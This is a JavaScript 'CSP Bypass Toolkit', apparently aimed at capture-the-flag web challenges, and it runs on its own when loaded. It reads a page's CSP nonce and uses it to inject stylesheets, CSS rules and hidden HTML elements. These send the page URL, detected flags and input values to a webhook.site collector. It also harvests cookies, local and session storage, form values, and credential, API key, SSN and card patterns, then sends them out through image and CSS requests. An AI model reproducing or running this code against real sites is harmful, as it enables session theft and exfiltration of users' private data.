// CSP Bypass Toolkit - Nonce Extraction, Style Injection, and Data Exfiltration
// Author: Security Research Tool
// Purpose: Educational/Research CSP bypass techniques
/*
Content-Security-Policy: default-src unpkg.com fonts.gstatic.com cdn.jsdelivr.net; style-src 'nonce-FEcgTSCJufmyU2eAVb4RKw==' unpkg.com fonts.googleapis.com cdn.jsdelivr.net;
*/
console.log('🔥 CSP Bypass Toolkit Loaded');

// ===================================
// 1. NONCE EXTRACTION MODULE
// ===================================

const NonceExtractor = {
    extract() {
        console.log('🔍 [NONCE] Starting nonce extraction...');
        
        // Method 1: DOM-based extraction
        const domNonce = this.extractFromDOM();
        if (domNonce) return domNonce;
        
        // Method 2: Source code regex extraction
        const regexNonce = this.extractFromSource();
        if (regexNonce) return regexNonce;
        
        // Method 3: CSP header parsing
        const cspNonce = this.extractFromCSP();
        if (cspNonce) return cspNonce;
        
        console.log('❌ [NONCE] No nonce found');
        return null;
    },
    
    extractFromDOM() {
        const selectors = [
            'style[nonce]', 'script[nonce]', 'link[nonce]', 
            '[nonce]', 'meta[nonce]'
        ];
        
        for (const selector of selectors) {
            const elements = document.querySelectorAll(selector);
            for (const element of elements) {
                const nonce = element.nonce || element.getAttribute('nonce');
                if (nonce) {
                    console.log('✅ [NONCE] Found via DOM:', { selector, nonce });
                    return nonce;
                }
            }
        }
        return null;
    },
    
    extractFromSource() {
        const html = document.documentElement.outerHTML;
        const patterns = [
            /nonce=["']([^"']+)["']/gi,
            /nonce:\s*["']([^"']+)["']/gi,
            /'nonce-([^']+)'/gi,
            /"nonce-([^"]+)"/gi
        ];
        
        for (const pattern of patterns) {
            const match = pattern.exec(html);
            if (match) {
                console.log('✅ [NONCE] Found via regex:', match[1]);
                return match[1];
            }
        }
        return null;
    },
    
    extractFromCSP() {
        const metas = document.querySelectorAll('meta[http-equiv="Content-Security-Policy"]');
        for (const meta of metas) {
            const content = meta.getAttribute('content');
            const nonceMatch = content.match(/'nonce-([^']+)'/);
            if (nonceMatch) {
                console.log('✅ [NONCE] Found in CSP meta:', nonceMatch[1]);
                return nonceMatch[1];
            }
        }
        return null;
    }
};

// ===================================
// 2. STYLE INJECTION MODULE
// ===================================

const StyleInjector = {
    inject(nonce, type = 'basic') {
        console.log(`🎨 [INJECT] Injecting ${type} styles with nonce:`, nonce);
        
        switch (type) {
            case 'basic':
                return this.injectBasic(nonce);
            case 'comp':
                return this.injectComp(nonce);
            case 'exfill':
                return this.injectExfill(nonce);
            case 'hunter':
                return this.injectHunter(nonce);
            case 'leak':
                return this.injectLeaks(nonce);
            case 'htmlleak':
                return this.injectHTMLLeaks(nonce);
            default:
                return this.injectBasic(nonce);
        }
    },

    injectCSSFile(nonce, filename) {
        const link = document.createElement('link');
        link.rel = 'stylesheet';
        link.href = filename;
        link.setAttribute('nonce', nonce);
        
        link.onload = () => {
            console.log(`✅ [INJECT] Loaded ${filename}`);
        };
        
        link.onerror = () => {
            console.log(`❌ [INJECT] Failed to load ${filename}`);
        };
        
        document.head.appendChild(link);
        console.log(`🎨 [INJECT] Injecting ${filename}`);
        return true;
    },
    
    injectBasic(nonce) {
        return this.injectCSSFile(nonce, 'https://cdn.jsdelivr.net/gh/ajinabraham/cdn@main/basic.css');
    },

    injectComp(nonce) {
        return this.injectCSSFile(nonce, 'https://cdn.jsdelivr.net/gh/ajinabraham/cdn@main/comp.css');
    },

    
    injectExfill(nonce) {
        const result = this.injectCSSFile(nonce, 'https://cdn.jsdelivr.net/gh/ajinabraham/cdn@main/exfill.css');
        
        // Add exfiltration indicator
        const indicator = document.createElement('div');
        indicator.setAttribute('nonce', nonce);
        indicator.className = 'exfill-indicator';
        indicator.textContent = '📡 DATA COLLECTION ACTIVE';
        document.body.appendChild(indicator);
        
        return result;
    },
    
    injectHunter(nonce) {
        return this.injectCSSFile(nonce, 'https://cdn.jsdelivr.net/gh/ajinabraham/cdn@main/flag_hunter.css');
    },

    injectLeaks(nonce) {
        const pageUrl = encodeURIComponent(location.href);
        const style = document.createElement('style');
        style.setAttribute('nonce', nonce);
        style.textContent = `
            /* CSS Import Leaks */
            @import url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=css_import&page=${pageUrl}');
            
            /* Font Face Leaks */
            @font-face {
                font-family: 'flag-detector';
                src: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=font_face&page=${pageUrl}');
            }
            html { font-family: 'flag-detector', sans-serif; }
            
            /* Flag Detection Leaks */
            input[value*="flag" i] { 
                background: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?vector=input_bg&type=flag&page=${pageUrl}');
                cursor: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?vector=input_cursor&type=flag&page=${pageUrl}'), auto;
            }
            
            input[value*="ctf{" i] { 
                background: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?vector=input_bg&type=ctf_bracket&page=${pageUrl}');
            }
            
            input[value*="flag{" i] { 
                background: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?vector=input_bg&type=flag_bracket&page=${pageUrl}');
            }
            
            input[type="hidden"][value*="flag" i] { 
                background: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?vector=hidden_input&type=flag&page=${pageUrl}');
            }
            
            form[action*="flag" i] { 
                background: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?vector=form_action&type=flag&page=${pageUrl}');
            }
            
            a[href*="flag" i] { 
                background: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?vector=link_href&type=flag&page=${pageUrl}');
            }
            
            a[href*="admin" i] { 
                background: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=link_href&type=admin&page=${pageUrl}');
            }
            
            meta[content*="flag" i] { 
                background: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?vector=meta_content&type=flag&page=${pageUrl}');
            }
            
            script[src*="flag" i] { 
                background: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?vector=script_src&type=flag&page=${pageUrl}');
            }
            
            html:has(input[value*="flag" i]) { 
                background: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?vector=has_selector&type=input_flag&page=${pageUrl}');
            }
            
            html:has(div[class*="flag" i]) { 
                background: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?vector=has_selector&type=div_class_flag&page=${pageUrl}');
            }
            
            html:has(div[id*="flag" i]) { 
                background: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?vector=has_selector&type=div_id_flag&page=${pageUrl}');
            }
            
            body::before {
                content: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=pseudo_before&loaded=true&page=${pageUrl}');
            }
            
            body::after {
                content: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=pseudo_after&loaded=true&page=${pageUrl}');
            }
            
            html {
                -webkit-mask-image: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=webkit_mask&loaded=true&page=${pageUrl}');
            }
        `;
        document.head.appendChild(style);
        return true;
    },

    injectHTMLLeaks(nonce) {
        console.log('🔗 [INJECT] Injecting HTML-based leak elements...');
        
        // Create container for leak elements
        const container = document.createElement('div');
        container.style.display = 'none';
        container.setAttribute('nonce', nonce);
        container.innerHTML = `
            <!-- Link-based leaks -->
            <link rel="dns-prefetch" href="https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=dns_prefetch&page=${encodeURIComponent(location.href)}" nonce="${nonce}">
            <link rel="preconnect" href="https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=preconnect&page=${encodeURIComponent(location.href)}" nonce="${nonce}">
            <link rel="prefetch" href="https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=prefetch&page=${encodeURIComponent(location.href)}" nonce="${nonce}">
            <link rel="preload" href="https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=preload&page=${encodeURIComponent(location.href)}" nonce="${nonce}">
            
            <!-- Image-based leaks -->
            <img src="https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=img_src&page=${encodeURIComponent(location.href)}" style="display:none;" nonce="${nonce}">
            <img srcset="https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=img_srcset&page=${encodeURIComponent(location.href)}" style="display:none;" nonce="${nonce}">
            <img lowsrc="https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=img_lowsrc&page=${encodeURIComponent(location.href)}" style="display:none;" nonce="${nonce}">
            
            <!-- Object/Embed leaks -->
            <object data="https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=object_data&page=${encodeURIComponent(location.href)}" style="display:none;" nonce="${nonce}"></object>
            <embed src="https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=embed_src&page=${encodeURIComponent(location.href)}" style="display:none;" nonce="${nonce}">
            
            <!-- Audio/Video leaks -->
            <audio src="https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=audio_src&page=${encodeURIComponent(location.href)}" style="display:none;" nonce="${nonce}"></audio>
            <video poster="https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=video_poster&page=${encodeURIComponent(location.href)}" style="display:none;" nonce="${nonce}">
                <source src="https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=video_source&page=${encodeURIComponent(location.href)}" nonce="${nonce}">
                <track src="https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=video_track&page=${encodeURIComponent(location.href)}" nonce="${nonce}">
            </video>
            
            <!-- SVG-based leaks -->
            <svg style="display:none;" nonce="${nonce}">
                <image href="https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=svg_image&page=${encodeURIComponent(location.href)}"></image>
                <feImage href="https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=svg_feimage&page=${encodeURIComponent(location.href)}"></feImage>
            </svg>
            
            <!-- Form leaks -->
            <form action="https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=form_action&page=${encodeURIComponent(location.href)}" style="display:none;" nonce="${nonce}"></form>
            
            <!-- Input image leak -->
            <input type="image" src="https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/leak?vector=input_image&page=${encodeURIComponent(location.href)}" style="display:none;" nonce="${nonce}">
        `;
        
        document.body.appendChild(container);
        
        // Additional dynamic leaks
        this.createDynamicLeaks(nonce);
    },

    createDynamicLeaks(nonce) {
        console.log('⚡ [INJECT] Creating dynamic leak triggers...');
        
        // Create dynamic CSS leak based on page content
        const pageText = document.body.textContent.toLowerCase();
        
        if (pageText.includes('flag')) {
            const dynamicStyle = document.createElement('style');
            dynamicStyle.setAttribute('nonce', nonce);
            dynamicStyle.textContent = `
                body {
                    background: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?vector=dynamic_text_detection&content=flag_found&page=${encodeURIComponent(location.href)}');
                }
            `;
            document.head.appendChild(dynamicStyle);
        }
        
        // Check for specific flag patterns in text content
        const flagPatterns = [
            /flag\{[^}]+\}/gi,
            /ctf\{[^}]+\}/gi,
            /[A-Za-z0-9_]+\{[^}]+\}/gi
        ];
        
        flagPatterns.forEach((pattern, index) => {
            const matches = pageText.match(pattern);
            if (matches) {
                matches.forEach((match, matchIndex) => {
                    const leakStyle = document.createElement('style');
                    leakStyle.setAttribute('nonce', nonce);
                    leakStyle.textContent = `
                        html {
                            background: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?vector=pattern_match&pattern=${index}&match=${matchIndex}&flag=${encodeURIComponent(match)}&page=${encodeURIComponent(location.href)}');
                        }
                    `;
                    document.head.appendChild(leakStyle);
                });
            }
        });
        
        // Monitor for DOM changes and create new leaks
        this.setupDOMObserver(nonce);
    },

    setupDOMObserver(nonce) {
        const observer = new MutationObserver((mutations) => {
            mutations.forEach((mutation) => {
                if (mutation.type === 'childList') {
                    mutation.addedNodes.forEach((node) => {
                        if (node.nodeType === Node.ELEMENT_NODE) {
                            this.scanNewElement(node, nonce);
                        }
                    });
                }
            });
        });
        
        observer.observe(document.body, {
            childList: true,
            subtree: true
        });
    },

    scanNewElement(element, nonce) {
        // Check if new element contains flag-related content
        const text = element.textContent?.toLowerCase() || '';
        const html = element.outerHTML?.toLowerCase() || '';
        
        if (text.includes('flag') || html.includes('flag')) {
            const leakStyle = document.createElement('style');
            leakStyle.setAttribute('nonce', nonce);
            leakStyle.textContent = `
                body {
                    background: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?vector=dom_mutation&type=new_element&content=flag_detected&page=${encodeURIComponent(location.href)}');
                }
            `;
            document.head.appendChild(leakStyle);
        }
        
        // Check for specific input values
        if (element.tagName === 'INPUT' && element.value) {
            const value = element.value.toLowerCase();
            if (value.includes('flag') || value.includes('ctf')) {
                const leakStyle = document.createElement('style');
                leakStyle.setAttribute('nonce', nonce);
                leakStyle.textContent = `
                    body {
                        background: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/flag?vector=dynamic_input&value=${encodeURIComponent(element.value)}&page=${encodeURIComponent(location.href)}');
                    }
                `;
                document.head.appendChild(leakStyle);
            }
        }
    }
};

// ===================================
// 3. DATA EXFILTRATION MODULE
// ===================================

const DataExfiltrator = {
    collect() {
        console.log('📡 [EXFILL] Starting data collection...');
        
        const data = {
            url: location.href,
            domain: location.hostname,
            cookies: document.cookie,
            localStorage: this.getLocalStorage(),
            sessionStorage: this.getSessionStorage(),
            forms: this.getForms(),
            inputs: this.getInputs(),
            links: this.getLinks(),
            scripts: this.getScripts(),
            meta: this.getMetaTags(),
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent
        };
        
        console.log('📊 [EXFILL] Data collected:', data);
        return data;
    },
    
    getLocalStorage() {
        const storage = {};
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            storage[key] = localStorage.getItem(key);
        }
        return storage;
    },
    
    getSessionStorage() {
        const storage = {};
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            storage[key] = sessionStorage.getItem(key);
        }
        return storage;
    },
    
    getForms() {
        return Array.from(document.forms).map(form => ({
            action: form.action,
            method: form.method,
            inputs: Array.from(form.elements).map(el => ({
                name: el.name,
                type: el.type,
                value: el.type === 'password' ? '[REDACTED]' : el.value
            }))
        }));
    },
    
    getInputs() {
        return Array.from(document.querySelectorAll('input')).map(input => ({
            name: input.name,
            type: input.type,
            placeholder: input.placeholder,
            value: input.type === 'password' ? '[REDACTED]' : input.value
        }));
    },
    
    getLinks() {
        return Array.from(document.links).map(link => ({
            href: link.href,
            text: link.textContent.trim().substring(0, 50)
        })).filter(link => link.href);
    },
    
    getScripts() {
        return Array.from(document.scripts).map(script => ({
            src: script.src,
            type: script.type,
            hasNonce: !!script.nonce
        }));
    },
    
    getMetaTags() {
        return Array.from(document.querySelectorAll('meta')).map(meta => ({
            name: meta.name,
            property: meta.property,
            content: meta.content
        }));
    },
    
    exfiltrate(data, method = 'console', nonce = null) {
        console.log('🚀 [EXFILL] Exfiltrating data via:', method);
        
        switch (method) {
            case 'console':
                this.exfiltrateConsole(data);
                break;
            case 'css':
                this.exfiltrateCSS(data, nonce);
                break;
            case 'image':
                this.exfiltrateImage(data, nonce);
                break;
            case 'fetch':
                this.exfiltrateFetch(data);
                break;
        }
    },
    
    exfiltrateConsole(data) {
        console.log('📤 [EXFILL] Console exfiltration:');
        console.log('🔗 Base64 encoded:', btoa(JSON.stringify(data)));
        console.table(data);
    },
    
    exfiltrateCSS(data, nonce) {
        // CSS-based exfiltration using background images - requires nonce for CSP bypass
        if (!nonce) {
            console.log('❌ [EXFILL] CSS exfiltration failed - no nonce provided');
            return;
        }
        const encoded = btoa(JSON.stringify(data));
        const style = document.createElement('style');
        style.setAttribute('nonce', nonce);
        style.textContent = `
            body { 
                background-image: url('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497?data=${encoded}'); 
            }
        `;
        document.head.appendChild(style);
        console.log('🎨 [EXFILL] CSS exfiltration attempted with nonce');
    },
    
    exfiltrateImage(data, nonce) {
        // Image-based exfiltration - requires nonce for CSP bypass
        if (!nonce) {
            console.log('❌ [EXFILL] Image exfiltration failed - no nonce provided');
            return;
        }
        const encoded = btoa(JSON.stringify(data));
        const img = document.createElement('img');
        img.setAttribute('nonce', nonce);
        img.src = `https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497?data=${encoded}`;
        img.style.display = 'none';
        document.body.appendChild(img);
        console.log('🖼️ [EXFILL] Image exfiltration attempted with nonce');
    },
    
    exfiltrateFetch(data) {
        // ❌ REMOVED: Fetch will always be blocked by CSP connect-src directive
        console.log('❌ [EXFILL] Fetch method disabled - always blocked by CSP connect-src');
        console.log('💡 [EXFILL] Use CSS or Image exfiltration instead');
    }
};

// ===================================
// 4. HUNTER MODULE
// ===================================

const Hunter = {
    hunt() {
        console.log('🎯 [HUNTER] Starting hunt for sensitive data...');
        
        const findings = {
            flags: this.findFlags(),
            credentials: this.findCredentials(),
            apiKeys: this.findApiKeys(),
            secrets: this.findSecrets(),
            adminPaths: this.findAdminPaths(),
            vulnInputs: this.findVulnerableInputs(),
            sensitiveData: this.findSensitiveData()
        };
        
        console.log('🏆 [HUNTER] Hunt results:', findings);
        return findings;
    },
    
    findCredentials() {
        const patterns = [
            /password\s*[:=]\s*['"]([^'"]+)['"]/gi,
            /pwd\s*[:=]\s*['"]([^'"]+)['"]/gi,
            /pass\s*[:=]\s*['"]([^'"]+)['"]/gi
        ];
        
        return this.searchPatterns(patterns, 'credentials');
    },
    
    findApiKeys() {
        const patterns = [
            /api[_-]?key\s*[:=]\s*['"]([^'"]+)['"]/gi,
            /apikey\s*[:=]\s*['"]([^'"]+)['"]/gi,
            /api[_-]?secret\s*[:=]\s*['"]([^'"]+)['"]/gi,
            /bearer\s+([a-zA-Z0-9\-_]+)/gi
        ];
        
        return this.searchPatterns(patterns, 'api_keys');
    },
    
    findSecrets() {
        const patterns = [
            /secret\s*[:=]\s*['"]([^'"]+)['"]/gi,
            /token\s*[:=]\s*['"]([^'"]+)['"]/gi,
            /key\s*[:=]\s*['"]([^'"]+)['"]/gi
        ];
        
        return this.searchPatterns(patterns, 'secrets');
    },
    
    findAdminPaths() {
        const adminSelectors = [
            'a[href*="admin"]',
            'a[href*="/admin"]',
            'a[href*="dashboard"]',
            'a[href*="manage"]',
            'a[href*="control"]'
        ];
        
        const adminLinks = [];
        adminSelectors.forEach(selector => {
            document.querySelectorAll(selector).forEach(link => {
                adminLinks.push({
                    url: link.href,
                    text: link.textContent.trim()
                });
            });
        });
        
        return adminLinks;
    },
    
    findVulnerableInputs() {
        const vulnInputs = [];
        document.querySelectorAll('input').forEach(input => {
            if (this.isVulnerableInput(input)) {
                vulnInputs.push({
                    name: input.name,
                    type: input.type,
                    placeholder: input.placeholder,
                    vulnerability: this.getVulnerabilityType(input)
                });
            }
        });
        
        return vulnInputs;
    },
    
    isVulnerableInput(input) {
        const vulnPatterns = [
            /pass/i, /secret/i, /token/i, /key/i, /api/i, /admin/i
        ];
        
        const checkString = `${input.name} ${input.placeholder} ${input.className}`;
        return vulnPatterns.some(pattern => pattern.test(checkString));
    },
    
    getVulnerabilityType(input) {
        if (/pass/i.test(input.name + input.placeholder)) return 'password';
        if (/secret/i.test(input.name + input.placeholder)) return 'secret';
        if (/token/i.test(input.name + input.placeholder)) return 'token';
        if (/api/i.test(input.name + input.placeholder)) return 'api_key';
        return 'sensitive';
    },
    
    findSensitiveData() {
        const sensitiveData = [];
        const textContent = document.body.textContent;
        
        const patterns = [
            { name: 'emails', pattern: /[\w\.-]+@[\w\.-]+\.\w+/gi },
            { name: 'phones', pattern: /(\+?\d{1,3}[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}/gi },
            { name: 'ssns', pattern: /\d{3}-\d{2}-\d{4}/gi },
            { name: 'credit_cards', pattern: /\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}/gi },
            { name: 'flags', pattern: /flag\{[^}]+\}/gi },
            { name: 'ctf_flags', pattern: /[A-Za-z0-9_]+\{[^}]+\}/gi }
        ];
        
        patterns.forEach(({ name, pattern }) => {
            const matches = textContent.match(pattern);
            if (matches) {
                sensitiveData.push({ type: name, data: matches });
            }
        });
        
        return sensitiveData;
    },

    findFlags() {
        console.log('🚩 [HUNTER] Searching for CTF flags...');
        const flags = [];
        
        // Search for flag files in links
        const flagLinks = [];
        document.querySelectorAll('a').forEach(link => {
            const href = link.href.toLowerCase();
            const text = link.textContent.toLowerCase();
            if (href.includes('flag') || text.includes('flag') || 
                href.includes('flag.txt') || text.includes('flag.txt')) {
                flagLinks.push({
                    url: link.href,
                    text: link.textContent.trim()
                });
            }
        });
        
        // Search for flag patterns in text content
        const textContent = document.body.textContent;
        const flagPatterns = [
            /flag\{[^}]+\}/gi,
            /[A-Za-z0-9_]+\{[^}]+\}/gi,
            /CTF\{[^}]+\}/gi,
            /FLAG\{[^}]+\}/gi
        ];
        
        const flagMatches = [];
        flagPatterns.forEach(pattern => {
            const matches = textContent.match(pattern);
            if (matches) {
                flagMatches.push(...matches);
            }
        });
        
        // Search for flag-related input fields
        const flagInputs = [];
        document.querySelectorAll('input').forEach(input => {
            const name = (input.name || '').toLowerCase();
            const placeholder = (input.placeholder || '').toLowerCase();
            const id = (input.id || '').toLowerCase();
            
            if (name.includes('flag') || placeholder.includes('flag') || id.includes('flag')) {
                flagInputs.push({
                    name: input.name,
                    type: input.type,
                    placeholder: input.placeholder,
                    value: input.value
                });
            }
        });
        
        return {
            flagLinks,
            flagMatches,
            flagInputs
        };
    },
    
    searchPatterns(patterns, type) {
        const results = [];
        const searchText = document.documentElement.outerHTML;
        
        patterns.forEach(pattern => {
            let match;
            while ((match = pattern.exec(searchText)) !== null) {
                results.push({
                    type: type,
                    value: match[1] || match[0],
                    context: match.input.substr(Math.max(0, match.index - 20), 40)
                });
            }
        });
        
        return results;
    }
};

// ===================================
// 5. MAIN EXECUTION
// ===================================

const CSPBypass = {
    run(mode = 'all') {
        console.log('🚀 [MAIN] Starting CSP Bypass Toolkit...');
        
        // Extract nonce
        const nonce = NonceExtractor.extract();
        if (!nonce) {
            console.log('❌ [MAIN] No nonce found - CSP bypass not possible');
            return false;
        }
        
        console.log('✅ [MAIN] Nonce extracted:', nonce);
        
        // Execute based on mode
        switch (mode) {
            case 'basic':
                StyleInjector.inject(nonce, 'basic');
                break;
                
            case 'comp':
                StyleInjector.inject(nonce, 'comp');
                break;
                

                
            case 'exfill':
                StyleInjector.inject(nonce, 'exfill');
                const data = DataExfiltrator.collect();
                DataExfiltrator.exfiltrate(data, 'console', nonce);
                break;
                
            case 'hunter':
                StyleInjector.inject(nonce, 'hunter');
                const findings = Hunter.hunt();
                console.log('🎯 [MAIN] Hunt complete:', findings);
                break;
                
            case 'flag':
                console.log('🚩 [MAIN] Running flag hunting mode...');
                StyleInjector.inject(nonce, 'hunter');
                const flags = Hunter.findFlags();
                const flagData = {
                    url: location.href,
                    domain: location.hostname,
                    flags: flags,
                    timestamp: new Date().toISOString()
                };
                console.log('🚩 [MAIN] Flags found:', flags);
                DataExfiltrator.exfiltrate(flagData, 'fetch', nonce);
                DataExfiltrator.exfiltrate(flagData, 'image', nonce);
                DataExfiltrator.exfiltrate(flagData, 'console', nonce);
                break;
                
            case 'leak':
                StyleInjector.inject(nonce, 'leak');
                break;
                
            case 'htmlleak':
                StyleInjector.inject(nonce, 'htmlleak');
                break;
                
            case 'all':
            default:
                console.log('🔥 [MAIN] Running full bypass suite...');
                StyleInjector.inject(nonce, 'basic');
                StyleInjector.inject(nonce, 'comp');
                StyleInjector.inject(nonce, 'exfill');
                StyleInjector.inject(nonce, 'hunter');
                StyleInjector.inject(nonce, 'leak');
                StyleInjector.inject(nonce, 'htmlleak');
                const fullData = DataExfiltrator.collect();
                const huntResults = Hunter.hunt();
                DataExfiltrator.exfiltrate({ data: fullData, hunt: huntResults }, 'console', nonce);
                DataExfiltrator.exfiltrate({ data: fullData, hunt: huntResults }, 'fetch', nonce);
                break;
        }
        
        console.log('✅ [MAIN] CSP Bypass execution complete');
        return true;
    }
};

// ===================================
// 6. AUTO-EXECUTION
// ===================================

// Auto-run on load
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => CSPBypass.run());
} else {
    CSPBypass.run();
}

// Expose global functions for manual execution
window.CSPBypass = CSPBypass;
window.runBasic = () => CSPBypass.run('basic');
window.runComp = () => CSPBypass.run('comp');
window.runExfill = () => CSPBypass.run('exfill');
window.runHunter = () => CSPBypass.run('hunter');
window.runFlag = () => CSPBypass.run('flag');
window.runLeak = () => CSPBypass.run('leak');
window.runHTMLLeak = () => CSPBypass.run('htmlleak');
